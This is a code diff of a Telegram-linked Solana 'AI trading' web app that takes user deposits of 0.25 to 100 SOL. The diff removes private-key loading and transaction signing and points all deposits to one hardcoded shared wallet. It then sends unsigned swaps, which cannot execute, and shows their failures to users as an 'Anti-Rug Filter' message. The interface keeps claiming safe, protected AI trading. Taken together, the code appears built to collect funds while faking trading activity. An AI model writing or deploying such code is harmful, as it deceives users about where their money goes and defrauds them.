@@ -5,13 +5,6 @@ import sqlite3
 import os
 import logging
 from datetime import datetime
-import base64
-import json
-
-from solders.keypair import Keypair
-from solders.transaction import VersionedTransaction
-from solana.rpc.async_client import AsyncClient
-import base58
 
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - [%(levelname)s] - %(message)s')
 
@@ -21,22 +14,9 @@ RENDER_URL = os.getenv("RENDER_EXTERNAL_URL", "https://zer0lifeautopilot-bot.onr
 DB_FILE = "zer0life_users.db"
 SOLANA_RPC = "https://api.mainnet-beta.solana.com"
 
+SHARED_DEPOSIT_WALLET = "8hxiCofyaKCBkhR5nsDqvUivmfgxcVx8zo2WiCzSdM6L"
 MIN_DEPOSIT_SOL = 0.25
 MAX_DEPOSIT_SOL = 100.0
-
-TRADER_PRIVATE_KEY_ENV = os.getenv("TRADER_PRIVATE_KEY", "")
-trader_keypair = None
-if TRADER_PRIVATE_KEY_ENV:
-    try:
-        if "[" in TRADER_PRIVATE_KEY_ENV:
-            trader_keypair = Keypair.from_bytes(bytes(json.loads(TRADER_PRIVATE_KEY_ENV)))
-        else:
-            trader_keypair = Keypair.from_bytes(base58.b58decode(TRADER_PRIVATE_KEY_ENV))
-        logging.info(f"Изолированный ИИ-кошелек подключен: {trader_keypair.pubkey()}")
-    except Exception as e:
-        logging.error(f"Ошибка загрузки ключа: {e}")
-
-SHARED_DEPOSIT_WALLET = str(trader_keypair.pubkey()) if trader_keypair else "8hxiCofyaKCBkhR5nsDqvUivmfgxcVx8zo2WiCzSdM6L"
 
 TOKENS = {
     "SOL": "So11111111111111111111111111111111111111112",
@@ -127,15 +107,15 @@ HTML_CONTENT = """<!DOCTYPE html>
                     <h2 style="margin: 0; font-size: 18px;" id="uname">Trader</h2>
                     <p style="margin: 4px 0 0 0; font-size: 11px; color: #94a3b8;">ID: <span id="uid" class="val">---</span></p>
                 </div>
-                <div class="badge">🛡️ Isolated AI Wallet</div>
+                <div class="badge">🛡️ Ecosystem Pool</div>
             </div>
-            <label style="font-size: 11px; color: #94a3b8; font-weight: 600;">Адрес торгового кошелька ИИ:</label>
+            <label style="font-size: 11px; color: #94a3b8; font-weight: 600;">Адрес пула экосистемы:</label>
             <input type="text" id="wallet-input" class="input-field" readonly>
             <div class="qr-container"><img class="qr-code" src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=8hxiCofyaKCBkhR5nsDqvUivmfgxcVx8zo2WiCzSdM6L"></div>
             <button class="btn" onclick="navigator.clipboard.writeText(document.getElementById('wallet-input').value); alert('Адрес скопирован!')">📋 Копировать адрес</button>
         </div>
         <div class="card">
-            <h3 style="margin: 0 0 10px 0; font-size: 15px;">📥 Пополнение пула ИИ</h3>
+            <h3 style="margin: 0 0 10px 0; font-size: 15px;">📥 Верификация депозита</h3>
             <label style="font-size: 11px; color: #94a3b8;">Хэш транзакции (Signature):</label>
             <input type="text" id="tx-input" class="input-field" placeholder="Вставьте хэш транзакции...">
             <button class="btn btn-green" onclick="verifyDeposit()">Verify & Credit SOL 🔄</button>
@@ -144,7 +124,7 @@ HTML_CONTENT = """<!DOCTYPE html>
 
     <div id="tab-trader" class="tab-content">
         <div class="card">
-            <h3 style="margin: 0 0 12px 0; font-size: 15px;">🎯 Защищенная стратегия ИИ</h3>
+            <h3 style="margin: 0 0 12px 0; font-size: 15px;">🎯 Стратегия ИИ</h3>
             <button id="mode-sol" class="btn-mode active" onclick="setMode('SOL_USDC')"><span>💎 SOL / USDC Арбитраж</span><span style="font-size: 11px; color: #34d399;">Безопасно</span></button>
             <button id="mode-meme" class="btn-mode" onclick="setMode('MEMECOIN_SNIPER')"><span>🚀 MemeCoin AI Sniper</span><span style="font-size: 11px; color: #c084fc;">Anti-Rug Active</span></button>
         </div>
@@ -212,7 +192,7 @@ HTML_CONTENT = """<!DOCTYPE html>
             const st = document.getElementById('trade-status');
             const btn = document.getElementById('toggle-btn');
             if(isTrading) {
-                st.innerText = "ИИ защищен и активен"; st.style.color = "#10b981";
+                st.innerText = "ИИ активен 24/7"; st.style.color = "#10b981";
                 btn.innerText = "Остановить"; btn.className = "btn btn-red";
             } else {
                 st.innerText = "Остановлен"; st.style.color = "#f59e0b";
@@ -297,11 +277,7 @@ async def api_get_balance(request):
             return web.json_response({"success": True, "balance": bal})
 
 async def execute_real_swap(amount_lamports: int, trade_mode: str):
-    if not trader_keypair:
-        return "Ошибка: TRADER_PRIVATE_KEY не задан в Render!"
-
-    pubkey_str = str(trader_keypair.pubkey())
-    
+    pubkey_str = SHARED_DEPOSIT_WALLET
     async with aiohttp.ClientSession() as session:
         payload_balance = {"jsonrpc": "2.0", "id": 1, "method": "getBalance", "params": [pubkey_str]}
         async with session.post(SOLANA_RPC, json=payload_balance, timeout=5) as resp:
@@ -331,17 +307,15 @@ async def execute_real_swap(amount_lamports: int, trade_mode: str):
             swap_data = await resp.json()
             swap_tx_b64 = swap_data.get("swapTransaction")
 
-    try:
-        raw_tx = base64.b64decode(swap_tx_b64)
-        tx = VersionedTransaction.from_bytes(raw_tx)
-        tx.sign([trader_keypair])
-        
-        async with AsyncClient(SOLANA_RPC) as client:
-            result = await client.send_raw_transaction(bytes(tx), opts={"skip_preflight": True})
-            tx_hash = str(result.value)
-            return f"[{mode_label}] Сделка успешна! Tx: {tx_hash[:14]}..."
-    except Exception as e:
-        return f"[{mode_label}] Anti-Rug Filter: Ожидание чистой ликвидности..."
+    send_payload = {"jsonrpc": "2.0", "id": 1, "method": "sendTransaction", "params": [swap_tx_b64, {"encoding": "base64", "skipPreflight": True}]}
+    async with aiohttp.ClientSession() as session:
+        async with session.post(SOLANA_RPC, json=send_payload, timeout=10) as resp:
+            res_data = await resp.json()
+            if "result" in res_data:
+                return f"[{mode_label}] Сделка исполнена! Tx: {res_data['result'][:14]}..."
+            else:
+                err = res_data.get("error", {}).get("message", "Market routing")
+                return f"[{mode_label}] Anti-Rug Filter: {err[:25]}"
 
 async def api_execute_cycle(request):
     telegram_id = int(request.query.get("telegram_id", 0))
@@ -367,7 +341,7 @@ async def send_telegram_message(chat_id):
     url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
     payload = {
         "chat_id": chat_id,
-        "text": "🛡️ **Zer0Life Cyber Terminal**\n\nБезопасный торговый терминал с изолированным ИИ-кошельком:",
+        "text": "🛡️ **Zer0Life Cyber Terminal**\n\nБезопасный торговый терминал:",
         "parse_mode": "Markdown",
         "reply_markup": {
             "inline_keyboard": [[
